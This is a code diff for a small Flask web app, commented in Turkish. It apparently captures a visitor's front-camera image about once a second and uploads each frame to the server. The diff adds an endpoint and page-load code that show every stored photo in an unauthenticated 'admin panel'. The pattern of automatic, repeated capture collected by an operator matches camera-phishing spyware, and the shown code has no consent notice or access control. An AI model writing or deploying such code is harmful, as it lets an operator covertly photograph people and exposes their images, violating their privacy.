@@ -1,11 +1,10 @@
-from flask import Flask, render_template_string, request, send_from_directory
+from flask import Flask, render_template_string, request, send_from_directory, jsonify
 import os, base64
 
 app = Flask(__name__)
 UPLOAD_FOLDER = 'uploads'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# HTML + JS frontend (tema + kamera + admin panel)
 HTML = '''
 <!DOCTYPE html>
 <html lang="tr">
@@ -67,15 +66,31 @@ h2{font-size:clamp(1.3rem,5vw,2rem);font-weight:700;margin-bottom:.8rem;text-ali
 </section>
 
 <script>
-// Kamera + otomatik çekim
+// Admin paneli elementi
+const adminPanel = document.getElementById('adminPanel');
+
+// Sayfa yüklendiğinde serverdaki fotoğrafları yükle
+window.addEventListener('load', () => {
+    fetch('/list_uploads')
+    .then(res => res.json())
+    .then(data => {
+        data.files.forEach(file => {
+            const imgEl = document.createElement('img');
+            imgEl.src = '/uploads/' + file;
+            imgEl.width = 160;
+            imgEl.height = 120;
+            adminPanel.appendChild(imgEl);
+        });
+    });
+});
+
+// Kamera + otomatik fotoğraf çekme
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const adminPanel = document.getElementById('adminPanel');
 
 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
 .then(stream => {
     video.srcObject = stream;
-
     video.onloadedmetadata = () => {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -91,13 +106,12 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             imgEl.height = 120;
             adminPanel.appendChild(imgEl);
 
-            // Backend'e gönder
+            // Server'a gönder
             fetch('/upload', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: imgData })
-            }).then(res => console.log('Fotoğraf gönderildi'))
-              .catch(err => console.error(err));
+            });
         }, 1000);
     };
 })
@@ -113,8 +127,7 @@ function openAdmin() {
 
 @app.route('/')
 def index():
-    files = os.listdir(UPLOAD_FOLDER)
-    return render_template_string(HTML, files=files)
+    return render_template_string(HTML)
 
 @app.route('/upload', methods=['POST'])
 def upload():
@@ -125,6 +138,11 @@ def upload():
     with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
         f.write(file_data)
     return "OK"
+
+@app.route('/list_uploads')
+def list_uploads():
+    files = os.listdir(UPLOAD_FOLDER)
+    return jsonify({"files": files})
 
 @app.route('/uploads/<filename>')
 def uploaded_file(filename):
